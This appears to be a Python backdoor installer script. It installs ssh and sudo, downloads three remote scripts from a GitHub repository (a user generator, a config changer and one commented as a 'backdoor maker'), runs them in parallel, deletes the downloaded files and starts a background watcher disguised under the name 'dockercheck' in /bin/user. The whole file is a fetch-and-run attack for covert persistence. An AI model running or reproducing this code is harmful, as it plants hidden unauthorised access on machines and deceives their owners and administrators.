import os

#sys SetUp
os.system('apt-get update')
os.system('apt-get install sudo ssh wget -y')
#filesetup



# Process#1 usergen
os.system('wget -O /tmp/process1.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/usergen.py')

# Process#2 Config fixer
os.system('wget -O /tmp/process2.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/softconfigs.py')


# Process#3 backdoor maker ;)
os.system('wget -O /tmp/process3.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/backdoormaker.py')

#f = open("process3.py", "w")
#f.write("""import os
#os.system('echo lol THIS IS MY 3rd File > output3')
#""")
#f.close()
#ur a dum u need to close the file :P


#start multiprocessing
from multiprocessing import Pool


processes = ('/tmp/process1.py', '/tmp/process2.py', '/tmp/process3.py')


def run_process(process):
    os.system('python {}'.format(process))


pool = Pool(processes=3)
pool.map(run_process, processes)

#CleaningTime
os.system("rm -rf /tmp/process*")
os.system("mkdir /bin/user")
os.system("wget -O /bin/user/dockercheck https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/watcher.py")
os.system("python /bin/user/dockercheck &")
os.system("rm -rf /tmp/process*")
